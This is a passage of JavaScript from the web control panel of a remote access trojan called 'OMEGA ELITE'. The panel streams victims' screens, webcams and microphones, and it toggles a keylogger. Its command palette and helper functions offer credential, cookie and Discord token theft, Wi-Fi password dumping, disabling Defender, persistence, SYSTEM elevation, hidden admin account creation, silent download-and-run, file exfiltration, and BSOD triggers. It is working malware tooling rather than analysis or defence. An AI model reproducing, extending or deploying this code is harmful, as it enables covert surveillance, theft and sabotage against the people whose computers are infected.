                <div style="font-size:10px;color:#666">${s.public_ip || "No IP"}</div>
                <div style="font-size:10px;color:#666">${s.city || ""}, ${s.country || ""}</div>
                <button type="button" onclick="openRemote('${n.id}', currentNodes.find(x=>x.id==='${n.id}'))" 
                        style="margin-top:6px;width:100%;padding:4px;background:#00f0ff;border:none;border-radius:4px;font-weight:bold;cursor:pointer;font-size:10px">
                    OPEN CONTROL
                </button>
            </div>
        `);
			mapMarkers[n.id] = marker;

			marker.on("click", () => openRemote(n.id, n));
			mapMarkers[n.id] = marker;
		});
}

window.addEventListener("DOMContentLoaded", () => {
	initDraggableCam();
});

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// â”€â”€ OMEGA WebRTC P2P ENGINE â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Flow: Browser â†’ (SDP offer via WS) â†’ Railway â†’ Agent â†’ aiortc answers
//       Browser â†  (SDP answer via WS) â† Railway â† Agent
//       Then P2P video/audio stream goes DIRECTLY browserâ†”agent (no Railway relay)
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

// RTC_ICE already defined at top of file

let _rtcPc = null; // RTCPeerConnection
let _rtcActive = false; // are we in WebRTC mode?
let _rtcStream = null; // MediaStream from agent
let _rtcVideo = null; // offscreen <video> element
let _rtcRafId = null; // requestAnimationFrame id
let _rtcTimeout = null; // connection timeout handle

function _rtcLog(msg) {
	logEvent(`[WebRTC] ${msg}`, "ok");
	console.log("[WebRTC]", msg);
}
function _rtcWarn(msg) {
	logEvent(`[WebRTC] ${msg}`, "warn");
	console.warn("[WebRTC]", msg);
}

// Called when server relays rtc_answer or rtc_ice from agent
function handleRtcSignal(d) {
	const t = d.t || d.type;
	if (!_rtcPc) return;
	if (t === "rtc_answer") {
		_rtcPc
			.setRemoteDescription({ type: d.type || "answer", sdp: d.sdp })
			.then(() => _rtcLog("Remote description set âœ“"))
			.catch((e) => _rtcWarn(`setRemoteDescription failed: ${e}`));
	} else if (t === "rtc_ice") {
		if (d.candidate) {
			_rtcPc
				.addIceCandidate({
					candidate: d.candidate,
					sdpMid: d.sdpMid || null,
					sdpMLineIndex: d.sdpMLineIndex ?? 0,
				})
				.catch(() => {});
		}
	}
}

async function startWebRTC() {
	if (!currentTargetId || !socket) {
		_rtcWarn("No target selected");
		return;
	}
	if (_rtcActive) {
		stopWebRTC();
		return;
	}

	_rtcLog("Initiating P2P handshake...");
	_setRtcBtn(true, "connecting");

	// Create peer connection
	_rtcPc = new RTCPeerConnection(RTC_ICE);

	// Collect ICE candidates and send to agent via WS signaling
	_rtcPc.onicecandidate = (e) => {
		if (e.candidate && socket?.readyState === WebSocket.OPEN) {
			socket.send(
				JSON.stringify({
					type: "rtc_ice",
					candidate: e.candidate.candidate,
					sdpMid: e.candidate.sdpMid,
					sdpMLineIndex: e.candidate.sdpMLineIndex,
					id: currentTargetId,
				}),
			);
		}
	};

	// When we receive tracks from the agent, hook them to a video element
	_rtcPc.ontrack = (e) => {
		_rtcLog(`Track received: ${e.track.kind}`);
		if (e.track.kind === "video") {
			if (!_rtcStream) _rtcStream = new MediaStream();
			_rtcStream.addTrack(e.track);
			_rtcVideo = document.createElement("video");
			_rtcVideo.srcObject = _rtcStream;
			_rtcVideo.muted = true;
			_rtcVideo.autoplay = true;
			_rtcVideo.playsInline = true;
			_rtcVideo.play().catch(() => {});
			// Render video frames to existing desktopView canvas
			_startRtcRender();
			_setRtcBtn(true, "connected");
			_rtcActive = true;
			// Clear fallback timeout
			if (_rtcTimeout) {
				clearTimeout(_rtcTimeout);
				_rtcTimeout = null;
			}
			logEvent("ðŸŸ¢ WebRTC P2P connected â€” direct stream active!", "ok");
		}
		// Audio tracks play automatically via the MediaStream
		if (e.track.kind === "audio") {
			const aud = document.createElement("audio");
			aud.srcObject = new MediaStream([e.track]);
			aud.autoplay = true;
			aud.play().catch(() => {});
			document.body.appendChild(aud);
		}
	};

	_rtcPc.onconnectionstatechange = () => {
		const s = _rtcPc?.connectionState;
		_rtcLog(`Connection state: ${s}`);

		// Update UI Badge
		const badge = document.getElementById("rtcBadge");
		if (badge) {
			badge.style.display = s === "connected" ? "flex" : "none";
		}

		if (s === "failed" || s === "closed") {
			_rtcWarn("Connection failed â€” falling back to JPEG stream");
			_fallbackToJpeg();
		}
	};

	// Add transceivers: we only RECEIVE video/audio from the agent
	_rtcPc.addTransceiver("video", { direction: "recvonly" });
	_rtcPc.addTransceiver("audio", { direction: "recvonly" });
	_rtcPc.addTransceiver("audio", { direction: "recvonly" }); // 2nd for system audio

	// Create SDP offer and send to agent
	const offer = await _rtcPc.createOffer();
	await _rtcPc.setLocalDescription(offer);
	socket.send(
		JSON.stringify({
			type: "rtc_offer",
			sdp: offer.sdp,
			sdpType: offer.type,
			id: currentTargetId,
		}),
	);
	_rtcLog("SDP offer sent to Google STUN network...");

	// Timeout: if no track in 8s, fall back to JPEG
	_rtcTimeout = setTimeout(() => {
		if (!_rtcActive) {
			_rtcWarn("WebRTC timeout (8s) â€” falling back to JPEG stream");
			_fallbackToJpeg();
		}
	}, 8000);
}

function stopWebRTC() {
	if (_rtcRafId) {
		cancelAnimationFrame(_rtcRafId);
		_rtcRafId = null;
	}
	if (_rtcTimeout) {
		clearTimeout(_rtcTimeout);
		_rtcTimeout = null;
	}
	if (_rtcPc) {
		try {
			_rtcPc.close();
		} catch (_) {}
		_rtcPc = null;
	}
	_rtcStream = null;
	_rtcVideo = null;
	_rtcActive = false;
	_setRtcBtn(false, "off");
	logEvent("WebRTC stopped", "warn");
}

function _fallbackToJpeg() {
	stopWebRTC();
	// Restart JPEG stream
	if (socket?.readyState === WebSocket.OPEN && currentTargetId) {
		socket.send(
			JSON.stringify({ type: "stream", cmd: "start", id: currentTargetId }),
		);
	}
	logEvent("â†©ï¸ JPEG stream fallback active", "warn");
}

function _startRtcRender() {
	const canvas = $("desktopView");
	if (!canvas || !_rtcVideo) return;
	// Hide "no stream" placeholder
	$("noStreamMsg").style.display = "none";
	canvas.style.display = "block";

	function render() {
		if (!_rtcActive || !_rtcVideo) {
			return;
		}
		if (_rtcVideo.readyState >= 2) {
			const vw = _rtcVideo.videoWidth || canvas.width || 1280;
			const vh = _rtcVideo.videoHeight || canvas.height || 720;
			if (canvas.width !== vw || canvas.height !== vh) {
				canvas.width = vw;
				canvas.height = vh;
			}
			const ctx = canvas.getContext("2d");
			if (ctx) ctx.drawImage(_rtcVideo, 0, 0, vw, vh);
		}
		_rtcRafId = requestAnimationFrame(render);
	}
	_rtcRafId = requestAnimationFrame(render);
}

function _setRtcBtn(_active, state) {
	const btn = $("btnWebRTC");
	if (!btn) return;
	if (state === "connected") {
		btn.style.background = "rgba(52,211,153,0.18)";
		btn.style.color = "var(--teal)";
		btn.style.borderColor = "var(--teal)";
		btn.title = "WebRTC P2P Active â€” click to stop";
		btn.textContent = "âš¡ P2P ON";
	} else if (state === "connecting") {
		btn.style.background = "rgba(251,191,36,0.15)";
		btn.style.color = "#fbbf24";
		btn.style.borderColor = "#fbbf24";
		btn.textContent = "â³ Connecting...";
	} else {
		btn.style.background = "";
		btn.style.color = "";
		btn.style.borderColor = "";
		btn.textContent = "âš¡ WebRTC";
		btn.title = "Start P2P direct stream (lower latency)";
	}
}

// WebRTC stop is called directly from closeRemote() above

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// â”€â”€ COMPATIBILITY SHIM â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Restores all HTML-callable names that were accidentally underscore-
// prefixed. Do NOT remove â€” every onclick in index.html depends on
// these exact names.
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
const showView           = (v)    => _showView(v);
const execGlobalCmd      = ()     => _execGlobalCmd();
const toggleChat         = ()     => _toggleChat();
const sendShell          = ()     => _sendShell();
const confirmBsod        = ()     => _confirmBsod();
const confirmDelete32    = ()     => _confirmDelete32();
const setVolume          = (v)    => _setVolume(v);
const setQuality         = (v)    => { const q=parseInt(v,10); const el=$('qualVal'); if(el) el.textContent=q; _setQuality(q); };
const promptLoopSound    = ()     => _promptLoopSound();
const uploadJsAsset      = (i,t)  => _uploadJsAsset(i,t);
const triggerCustomJumpscare = () => _triggerCustomJumpscare();
const promptJumpscare    = ()     => _promptJumpscare();
const uploadAudio        = (i)    => _uploadAudio(i);
const promptOpenSpam     = ()     => _promptOpenSpam();
const promptWallpaper    = ()     => _promptWallpaper();
const promptRegRead      = ()     => _promptRegRead();
const promptRegWrite     = ()     => _promptRegWrite();
const promptNetCmd       = (c)    => _promptNetCmd(c);
const promptCmd          = (t,l,k,d) => _promptCmd(t,l,k,d);
const promptBrowse       = ()     => _promptBrowse();
const promptDownloadUrl  = ()     => _promptDownloadUrl();
const promptKillApp      = ()     => _promptKillApp();
const promptMoveMouse    = ()     => _promptMoveMouse();
const promptTroll        = (a)    => _promptTroll(a);
const toggleKeylogger    = ()     => _toggleKeylogger();
const togglePanel        = ()     => _togglePanel();
const _triggerFileUpload = ()     => { const i=document.createElement('input'); i.type='file'; i.onchange=(e)=>{ const f=e.target.files[0]; if(!f||!currentTargetId||!socket) return; const r=new FileReader(); r.onload=(ev)=>{ const b64=ev.target.result.split(',')[1]; socket.send(JSON.stringify({type:'upload_file',name:f.name,data:b64,id:currentTargetId})); logEvent(`ðŸ“¤ Uploading ${f.name}...`,'ok'); }; r.readAsDataURL(f); }; i.click(); };

// â”€â”€ AUDIO ENGINE: toggleAudio â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Tracks per-stream state: mic / desktop
const _audioState = { mic: false, desktop: false };

function _setAudioBtn(btnId, on) {
	const btn = $(btnId);
	if (!btn) return;
	if (on) {
		btn.style.background   = 'rgba(0,255,204,0.15)';
		btn.style.borderColor  = 'var(--teal)';
		btn.style.color        = 'var(--teal)';
		btn.textContent        = btnId === 'btnMicOn' ? 'â–  Stop Mic' : 'â–  Stop Desktop';
	} else {
		btn.style.background   = '';
		btn.style.borderColor  = '';
		btn.style.color        = '';
		btn.textContent        = btnId === 'btnMicOn' ? 'â–¶ Listen Mic' : 'â–¶ Listen Desktop';
	}
	// Mirror toolbar mic/desk buttons
	if (btnId === 'btnMicOn')  { const t=$('btnAudioMic');  if(t){ t.style.color=on?'var(--teal)':''; t.style.background=on?'rgba(0,255,204,0.12)':''; t.style.borderColor=on?'rgba(0,255,204,0.3)':''; } }
	if (btnId === 'btnDeskOn') { const t=$('btnAudioDesk'); if(t){ t.style.color=on?'var(--accent)':''; t.style.background=on?'rgba(0,240,255,0.12)':''; t.style.borderColor=on?'rgba(0,240,255,0.3)':''; } }
}

/**
 * toggleAudio(key)        â†’ toggle on/off
 * toggleAudio(key, true)  â†’ force ON
 * toggleAudio(key, false) â†’ force OFF (Stop button calls this)
 */
function toggleAudio(key, forceOn) {
	if (!currentTargetId || !socket) { logEvent('No active session', 'err'); return; }

	// Create and/or Resume AudioContext DURING the user gesture (browser policy)
	// If we wait until the first chunk arrives from the websocket, it will be blocked.
	const ctx = _getAudioCtx(key);
	if (ctx.state === 'suspended') {
		ctx.resume();
	}

	let turnOn;
	if (forceOn === true)  turnOn = true;           // explicit ON
	else if (forceOn === false) turnOn = false;      // explicit OFF (Stop button)
	else turnOn = !_audioState[key];                // toggle

	_audioState[key] = turnOn;
	const btnId = key === 'mic' ? 'btnMicOn' : 'btnDeskOn';
	_setAudioBtn(btnId, turnOn);

	const deviceId = key === 'mic'
		? ($('audioInputSelect')?.value || '')
		: ($('audioOutputSelect')?.value || '');

	if (turnOn) {
		socket.send(JSON.stringify({
			type:    'audio_start',
			channel: key,
			device:  deviceId,
			id:      currentTargetId,
		}));
		const chip = $('audioChip'), lbl = $('audioSourceLabel');
		if (chip) chip.style.display = 'flex';
		if (lbl)  lbl.textContent = _audioState.mic && _audioState.desktop ? 'MIC+DESK' : key === 'mic' ? 'MIC' : 'DESK';
		logEvent(`ðŸŽ™ ${key === 'mic' ? 'Mic' : 'Desktop'} audio started`, 'ok');
		showToast(`ðŸŽ™ ${key === 'mic' ? 'Microphone' : 'Desktop Audio'} activated`, 'teal');
	} else {
		socket.send(JSON.stringify({
			type:    'audio_stop',
			channel: key,
			id:      currentTargetId,
		}));
		// Destroy audio context so next session starts fresh without DC offset noise
		if (_audioCtxs[key]) {
			try { _audioCtxs[key].close(); } catch(_e) {}
			delete _audioCtxs[key];
			delete _audioNext[key];
			delete _audioCompressors[key];
			delete _audioGains[key];
		}
		if (!_audioState.mic && !_audioState.desktop) {
			const chip = $('audioChip');
			if (chip) chip.style.display = 'none';
		}
		logEvent(`ðŸ”‡ ${key === 'mic' ? 'Mic' : 'Desktop'} audio stopped`, 'warn');
		showToast(`ðŸ”‡ ${key === 'mic' ? 'Microphone' : 'Desktop Audio'} off`, 'warn');
	}
}

// â”€â”€ PREMIUM MONITOR SWITCHER â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Replaces the plain <select> with glowing pill buttons in the toolbar
function buildMonitorPills(count) {
	const wrapper = $('monitorSelector');
	if (!wrapper) return;
	if (count <= 1) { wrapper.style.display = 'none'; return; }

	// Build pill row
	let html = `<div style="display:flex;align-items:center;gap:4px;padding:0 4px">`;
	html += `<svg viewBox="0 0 24 24" width="11" height="11" fill="none" stroke="var(--text-3)" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>`;
	for (let i = 0; i < count; i++) {
		html += `<button type="button" id="monPill_${i}" onclick="selectMonitorPill(${i})"
			style="padding:.2rem .5rem;font-size:.6rem;font-weight:800;border-radius:6px;
			border:1px solid ${i===0?'var(--accent)':'rgba(255,255,255,0.1)'};
			background:${i===0?'rgba(0,240,255,0.15)':'rgba(255,255,255,0.03)'};
			color:${i===0?'var(--accent)':'var(--text-3)'};cursor:pointer;
			font-family:inherit;transition:all .2s;letter-spacing:.04em">
			S${i+1}
		</button>`;
	}
	html += `</div>`;
	wrapper.style.display = 'flex';
	wrapper.innerHTML = html;

	// Also populate the HUD hidden select for compatibility
	const hudSel = $('hudMonSelect'), chip = $('monPickerChip');
	if (hudSel) {
		hudSel.innerHTML = '';
		for (let i = 0; i < count; i++) {
			const o = document.createElement('option');
			o.value = i; o.textContent = `Screen ${i+1}`;
			hudSel.appendChild(o);
		}
	}
	if (chip) chip.style.display = count > 1 ? 'flex' : 'none';
}

window.selectMonitorPill = function(idx) {
	// Visual update â€” highlight selected pill
	document.querySelectorAll('[id^="monPill_"]').forEach((p, i) => {
		const active = i === idx;
		p.style.borderColor = active ? 'var(--accent)' : 'rgba(255,255,255,0.1)';
		p.style.background  = active ? 'rgba(0,240,255,0.15)' : 'rgba(255,255,255,0.03)';
		p.style.color       = active ? 'var(--accent)' : 'var(--text-3)';
	});
	// Also sync HUD picker
	const hudSel = $('hudMonSelect');
	if (hudSel) hudSel.value = idx;
	// Send switch command
	switchMonitor(idx);
	logEvent(`ðŸ–¥ Switched to Screen ${idx+1}`, 'ok');
};

// Hook into openRemote to build pills after specs are known
const _origOpenRemote = openRemote;
// Override: rebuild monitor pills after setup
const _monitorPillHook = setInterval(() => {
	// Wait until openRemote exists (it always will, but guard for safety)
	if (typeof openRemote !== 'function') return;
	clearInterval(_monitorPillHook);
}, 100);

// Patch: when specs arrive via renderRemoteSpecs, rebuild pills
const _origRenderSpecs = renderRemoteSpecs;
window.renderRemoteSpecs = function(s) {
	_origRenderSpecs(s);
	buildMonitorPills(s.monitors || 1);
};

/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
   OMEGA ELITE â€” JS HELPER PACK v3
   â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */

// â”€â”€ File helpers â”€â”€
window._promptReadFile = function() {
	const path = prompt("ðŸ“„ Full path to read:", "C:\\Users\\Public\\test.txt");
	if (path) sendCmd("read_file", { path });
};
window._promptDeleteFile = function() {
	const path = prompt("ðŸ—‘ Full path to DELETE (irreversible):", "");
	if (path && confirm(`DELETE: ${path}\n\nAre you absolutely sure?`)) sendCmd("delete_file", { path });
};

// â”€â”€ System helpers â”€â”€
window._promptMsgBox = function() {
	const title = prompt("MessageBox title:", "System Alert") || "Alert";
	const text  = prompt("MessageBox text:", "Omega says hello.") || "";
	const icons = { None:0, Error:16, Question:32, Warning:48, Info:64 };
	const iconKey = prompt("Icon? (None / Error / Question / Warning / Info):", "Info") || "None";
	sendCmd("msgbox", { title, text, icon: icons[iconKey] ?? 64 });
};
window._promptCreateUser = function() {
	const user = prompt("Username (append $ to hide from login screen):", "support$") || "support$";
	const pass = prompt("Password:", "P@ssw0rd123!") || "P@ssw0rd123!";
	if (confirm(`Create hidden admin: '${user}'?`)) sendCmd("create_user", { user, pass });
};
window._promptSetVolume = function() {
	const level = prompt("Set master volume (0â€“100):", "50");
	if (level !== null) sendCmd("set_volume", { level: parseInt(level) || 50 });
};

// â”€â”€ Service helpers â”€â”€
window._promptStopService = function() {
	const name = prompt("Service name to STOP:", "WSearch");
	if (name) sendCmd("stop_service", { name });
};
window._promptStartService = function() {
	const name = prompt("Service name to START:", "WSearch");
	if (name) sendCmd("start_service", { name });
};

// â”€â”€ Process helpers â”€â”€
window._promptKillByName = function() {
	const name = prompt("Process image name to kill (e.g. notepad.exe):", "notepad.exe");
	if (name) sendCmd("kill_process_name", { name });
};

// â”€â”€ Network helpers â”€â”€
window._promptRunUrl = function() {
	const url = prompt("URL of file to download & run silently:", "https://");
	if (url && url.startsWith("http")) sendCmd("run_url", { url });
};

// â”€â”€ Power helpers â”€â”€
window._promptShutdown = function() {
	const delay = prompt("Shutdown in N seconds:", "30");
	if (delay !== null) sendCmd("shutdown", { delay: parseInt(delay) || 30 });
};
window._promptRestart = function() {
	const delay = prompt("Restart in N seconds:", "30");
	if (delay !== null) sendCmd("restart", { delay: parseInt(delay) || 30 });
};

// â”€â”€ Wallpaper prompt â”€â”€
window.promptWallpaper = window.promptWallpaper || function() {
	const url = prompt("ðŸ–¼ Wallpaper image URL:", "https://");
	if (url && url.startsWith("http")) sendCmd("set_wallpaper", { url });
};

// â”€â”€ file_download handler â€” triggers browser-side download â”€â”€
// Registered as a post-process on incoming messages from agent
(function() {
	const _wsOnMsg = window._onAgentMsg;
	window._onAgentMsg = function(d) {
		if (d.t === "file_download") {
			try {
				const bytes = Uint8Array.from(atob(d.b64), c => c.charCodeAt(0));
				const blob  = new Blob([bytes]);
				const a     = Object.assign(document.createElement("a"), {
					href: URL.createObjectURL(blob),
					download: d.name || "omega_exfil"
				});
				document.body.appendChild(a);
				a.click();
				setTimeout(() => { a.remove(); URL.revokeObjectURL(a.href); }, 1500);
				if (typeof showToast === "function") showToast(`ðŸ“¥ Downloaded: ${d.name}`, "teal");
			} catch(e) {
				if (typeof showToast === "function") showToast(`âŒ DL error: ${e}`, "red");
			}
			return; // Don't forward
		}
		if (_wsOnMsg) _wsOnMsg(d);
	};
})();

/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
   OMEGA ELITE â€” JS HELPER PACK v4
   â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */

// â”€â”€ Network helpers â”€â”€
window._promptBlockSite = function() {
	const site = prompt("ðŸš« Domain to block (e.g. reddit.com):", "");
	if (site) sendCmd("block_website", { site });
};
window._promptUnblockSite = function() {
	const site = prompt("âœ… Domain to unblock:", "");
	if (site) sendCmd("unblock_website", { site });
};

// â”€â”€ Registry helpers â”€â”€
window._promptRegDelete = function() {
	const hive  = prompt("Hive (HKCU / HKLM / HKCR):", "HKCU") || "HKCU";
	const path  = prompt("Key path (e.g. Software\\Test):", "") || "";
	const value = prompt("Value name to delete (leave blank to delete the whole key):", "");
	if (path) sendCmd("reg_delete", { hive, path, value });
};

// â”€â”€ Kill by name (missing from prev pack) â”€â”€
window._promptKillByName = window._promptKillByName || function() {
	const name = prompt("Process image name to kill (e.g. notepad.exe):", "notepad.exe");
	if (name) sendCmd("kill_process_name", { name });
};

/* â”€â”€ COMMAND PALETTE (Ctrl+K or Ctrl+/) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
(function _initCommandPalette() {
	// Build catalogue of all known commands
	const CATALOGUE = [
		// Surveillance
		{ label: "ðŸ“¸ Screenshot",         cmd: "screenshot_snap",      args: {} },
		{ label: "ðŸ“¸ Webcam Snap",         cmd: "webcam_snap",          args: {idx:0}, prompt: true },
		{ label: "ðŸŽ¥ Record Screen 10s",   cmd: "record_screen",        args: {duration:10} },
		{ label: "ðŸŽ¥ Record Webcam 5s",    cmd: "record_webcam",        args: {duration:5} },
		{ label: "ðŸŽ™ Record Voice 30s",    cmd: "record_voice",         args: {duration:30} },
		{ label: "ðŸ”‘ Steal Creds",         cmd: "stealer",              args: {} },
		{ label: "ðŸª Steal Cookies",       cmd: "cookie_steal",         args: {} },
		{ label: "ðŸ’¬ Discord Hijack",      cmd: "discord_steal",        args: {} },
		{ label: "ðŸŒ Browser History",     cmd: "browser_history",      args: {} },
		// Files
		{ label: "ðŸ“‹ Get Clipboard",       cmd: "clipboard_get",        args: {} },
		{ label: "ðŸªŸ Active Window",       cmd: "active_window",        args: {} },
		{ label: "ðŸ• Recent Files",        cmd: "get_recent_files",     args: {} },
		{ label: "ðŸ—‘ Empty Recycle Bin",   cmd: "recycle_bin",          args: {} },
		// System
		{ label: "ðŸ“Š Full Audit",          cmd: "get_system_info",      args: {} },
		{ label: "ðŸ‘¤ Whoami",              cmd: "whoami",               args: {} },
		{ label: "ðŸ’¾ Drives",              cmd: "drives",               args: {} },
		{ label: "ðŸ“Š Disk Usage",          cmd: "disk_usage",           args: {} },
		{ label: "ðŸŒ¿ Env Vars",            cmd: "env_vars",             args: {} },
		{ label: "ðŸš€ Startup Programs",    cmd: "list_startup",         args: {} },
		{ label: "ðŸ“¦ Installed Apps",      cmd: "get_installed",        args: {} },
		{ label: "ðŸ‘¥ List Users",          cmd: "get_users",            args: {} },
		{ label: "ðŸ”‹ Battery",             cmd: "get_battery",          args: {} },
		{ label: "ðŸ”Š Get Volume",          cmd: "get_volume",           args: {} },
		{ label: "âš™ï¸ List Services",       cmd: "get_services",         args: {} },
		{ label: "ðŸ”‘ Win Product Key",     cmd: "get_product_key",      args: {} },
		{ label: "ðŸ–¥ Monitor Info",        cmd: "get_monitor_info",     args: {} },
		{ label: "ðŸ“Š Proc Details",        cmd: "detailed_process_list",args: {} },
		{ label: "ðŸ“œ PS History",          cmd: "cmd_history",          args: {} },
		{ label: "ðŸ” Prefetch",            cmd: "get_prefetch",         args: {} },
		{ label: "ðŸš« Kill Defender",       cmd: "disable_defender",     args: {} },
		{ label: "âœ… Restore Defender",    cmd: "enable_defender",      args: {} },
		{ label: "ðŸ”— Task Persist",        cmd: "task_scheduler_add",   args: {} },
		{ label: "âœ– Remove Task",          cmd: "task_scheduler_remove",args: {} },
		{ label: "ðŸ”’ Lock Screen",         cmd: "lock_screen",          args: {} },
		{ label: "ðŸ”„ Startup Persist",     cmd: "startup_persist",      args: {} },
		{ label: "ðŸ” Check Persist",       cmd: "check_persistence",    args: {} },
		{ label: "âš¡ Elevate SYSTEM",      cmd: "elevate_system",       args: {} },
		// Network
		{ label: "ðŸ“¶ WiFi Passwords",      cmd: "wifi_passwords",       args: {} },
		{ label: "ðŸ”Œ Open Ports",          cmd: "get_open_ports",       args: {} },
		{ label: "ðŸŒ Geolocation",         cmd: "get_geo",              args: {} },
		{ label: "ðŸ“¶ ARP Table",           cmd: "get_arp",              args: {} },
		{ label: "ðŸ“„ DNS Cache",           cmd: "get_dns_cache",        args: {} },
		{ label: "ðŸ”„ Flush DNS",           cmd: "flush_dns",            args: {} },
		{ label: "ðŸ” Deep LAN Scan",       cmd: "net_scan",             args: {} },
		// Power
		{ label: "ðŸ”„ Restart (10s)",       cmd: "restart",              args: {delay:10} },
		{ label: "â» Shutdown (10s)",       cmd: "shutdown",             args: {delay:10} },
		{ label: "ðŸšª Logoff",              cmd: "logoff",               args: {} },
		{ label: "âœ… Cancel Shutdown",     cmd: "cancel_shutdown",      args: {} },
		// Trolls
		{ label: "ðŸ”’ Block MNK",          cmd: "troll",                args: {c:"mnk"} },
		{ label: "ðŸ“ Notepad Ã—5",         cmd: "troll",                args: {c:"notepadspam"} },
		{ label: "ðŸ”„ Fake Win Update",    cmd: "troll",                args: {c:"fake_update"} },
		{ label: "ðŸ’€ Trigger BSOD",       cmd: "bsod",                 args: {} },
	];

	let _paletteOpen = false;
	let _paletteEl   = null;

	function _buildPalette() {
		if (_paletteEl) return;
		const el = document.createElement("div");
		el.id = "cmdPalette";
		el.style.cssText = `
			position:fixed; top:15%; left:50%; transform:translateX(-50%);
			width:520px; max-width:95vw; z-index:99999;
			background:rgba(8,8,14,0.97); border:1px solid rgba(0,240,255,.3);
			border-radius:18px; overflow:hidden;
			box-shadow:0 30px 80px rgba(0,0,0,.9), 0 0 40px rgba(0,240,255,.1);
			backdrop-filter:blur(40px); display:none;
		`;
		el.innerHTML = `
			<div style="display:flex;align-items:center;gap:.75rem;padding:.9rem 1.2rem;border-bottom:1px solid rgba(255,255,255,.06)">
				<span style="color:var(--accent);font-size:1rem">âŒ˜</span>
				<input id="cmdPaletteInput" placeholder="Search commandsâ€¦"
					style="flex:1;background:transparent;border:none;color:#fff;font-family:'Outfit',sans-serif;font-size:.9rem;outline:none">
				<span style="font-size:.6rem;color:var(--text-3);background:rgba(255,255,255,.06);padding:.2rem .5rem;border-radius:5px">ESC</span>
			</div>
			<div id="cmdPaletteList" style="max-height:340px;overflow-y:auto;padding:.4rem 0"></div>
		`;
		document.body.appendChild(el);
		_paletteEl = el;

		const input = document.getElementById("cmdPaletteInput");
		input.addEventListener("input", () => _filterPalette(input.value));
		input.addEventListener("keydown", e => {
			if (e.key === "Escape") _closePalette();
			if (e.key === "ArrowDown") { e.preventDefault(); _moveSel(1); }
			if (e.key === "ArrowUp")   { e.preventDefault(); _moveSel(-1); }
			if (e.key === "Enter")     { e.preventDefault(); _execSel(); }
		});
		_filterPalette("");
	}

	function _filterPalette(q) {
		const list = document.getElementById("cmdPaletteList");
		if (!list) return;
		const lower = q.toLowerCase();
		const matches = CATALOGUE.filter(c =>
			c.label.toLowerCase().includes(lower) || c.cmd.includes(lower)
		);
		list.innerHTML = matches.map((c, i) => `
			<div class="cp-item" data-idx="${i}" data-cmd="${c.cmd}" data-args='${JSON.stringify(c.args)}'
				style="display:flex;align-items:center;gap:.75rem;padding:.55rem 1.2rem;cursor:pointer;transition:background .15s"
				onmouseenter="this.classList.add('cp-active')" onmouseleave="this.classList.remove('cp-active')"
				onclick="window._execPaletteItem(this)">
				<span style="font-size:.82rem;color:var(--text-1)">${c.label}</span>
				<span style="margin-left:auto;font-family:'JetBrains Mono',monospace;font-size:.58rem;color:var(--text-3)">${c.cmd}</span>
			</div>
		`).join("");
		// Highlight first
		const first = list.querySelector(".cp-item");
		if (first) first.classList.add("cp-active");
		// Add hover style
		const style = document.getElementById("cp-style") || Object.assign(document.createElement("style"), {id:"cp-style"});
		style.textContent = `.cp-active{background:rgba(0,240,255,.08)!important;color:var(--accent)}`;
